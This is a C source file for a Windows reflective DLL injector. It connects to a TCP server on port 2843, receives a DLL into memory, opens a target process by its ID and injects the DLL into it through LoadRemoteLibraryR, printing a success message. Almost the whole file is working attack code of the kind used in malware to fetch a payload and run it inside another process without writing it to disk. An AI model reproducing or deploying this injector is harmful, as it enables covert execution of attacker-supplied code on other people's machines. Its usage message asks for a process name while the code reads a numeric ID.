#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>
#include "reflective_loader.h"

#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")

#define DEFAULT_PORT "2843"

int main(int argc, char** argv)
{
	HANDLE hTargetProcess = NULL;
	HANDLE hModule = NULL;
	DWORD dwBytesRead = 0;
	DWORD dwTargetProcessID = NULL;
	if (argc < 2)
	{
		ERROR("Wrong usage. Try: Injector.exe <name of target process>");
		return 0;
	}
	dwTargetProcessID = atoi(argv[INDEX_TARGET_PROCESS_ID]);
	if (!dwTargetProcessID) {
		ERROR("Could not find target process, maybe it is not running");
		return 0;
	}

	struct addrinfo* result = NULL, hints;

	// Initialize Winsock
	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
		ERROR_WITH_CODE("initialization failed");
	}

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	// Resolve the server address and port
	if (getaddrinfo(NULL, DEFAULT_PORT, &hints, &result) != 0) {
		WSACleanup();
		ERROR_WITH_CODE("getaddrinfo failed");
	}

	// Create socket
	SOCKET clientSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
	if (clientSocket == INVALID_SOCKET) {
		WSACleanup();
		ERROR_WITH_CODE("socket creation failed");
	}

	// Connect to the server
	struct sockaddr_in serverAddr;
	serverAddr.sin_family = AF_INET;
	serverAddr.sin_port = htons(2843);
	serverAddr.sin_addr.s_addr = inet_addr("127.0.0.1");
	if (connect(clientSocket, result->ai_addr, (int)result->ai_addrlen) == SOCKET_ERROR) {
		closesocket(clientSocket);
		WSACleanup();
		ERROR_WITH_CODE("connection failed");
	}

	// Receive data from the server and store in a buffer
	char receivedBuffer[12288]; // Adjust the size according to your DLL size (ToDo change this to the code that uses heap for this)
	int bytesReceived = recv(clientSocket, receivedBuffer, sizeof(receivedBuffer), 0);
	if (bytesReceived == SOCKET_ERROR) {
		// Handle receive error
		closesocket(clientSocket);
		WSACleanup();
		ERROR_WITH_CODE("recv failed");
	}

	// shutdown the connection since no more data will be sent
	if (shutdown(clientSocket, SD_SEND) == SOCKET_ERROR) {
		closesocket(clientSocket);
		WSACleanup();
		ERROR_WITH_CODE("shutdown failed");
	}

	// Clean up
	closesocket(clientSocket);
	WSACleanup();

	// Create an LPVOID variable and copy the received data
	LPVOID lpBuffer = malloc(bytesReceived); // Allocate memory for the LPVOID buffer
	memcpy(lpBuffer, receivedBuffer, bytesReceived); // Copy received data to lpBuffer

	hTargetProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
		PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, dwTargetProcessID);
	if (!hTargetProcess)
		ERROR_WITH_CODE("Failed to open the target process");

	hModule = LoadRemoteLibraryR(hTargetProcess, lpBuffer, bytesReceived, NULL);
	if (!hModule)
		ERROR_WITH_CODE("Failed to inject the DLL");
	printf("[+] Injected the DLL into process %d.", dwTargetProcessID);

	free(lpBuffer);

	WaitForSingleObject(hModule, -1);
	return 1;
}